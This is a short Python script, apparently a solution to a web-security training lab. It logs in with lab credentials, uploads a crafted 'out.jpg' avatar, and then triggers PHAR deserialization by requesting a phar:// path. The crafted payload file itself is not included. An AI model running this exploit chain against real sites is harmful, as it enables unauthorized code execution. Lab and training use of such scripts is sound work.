import sys
import re
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    upload_url = burp_url + '/my-account/avatar'
    login_url = burp_url + '/login'
    zapas_url = burp_url + '/my-account'
    final_url = burp_url + '/cgi-bin/avatar.php?avatar=phar://wiener'

    session = requests.Session()

    response = session.get(login_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf = csrf_token_match.group(1)

    burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    session.post(login_url, data=burp_data)

    response = session.get(zapas_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf = csrf_token_match.group(1)

    # Wysyłanie pliku z tokenem CSRF jako dane formularza
    files = {
        'avatar': ('out.jpg', open('out.jpg', 'rb'), 'image/jpeg')
    }
    data = {
        'csrf': csrf
    }

    response = session.post(upload_url, files=files, data=data)

    response = session.get(final_url)
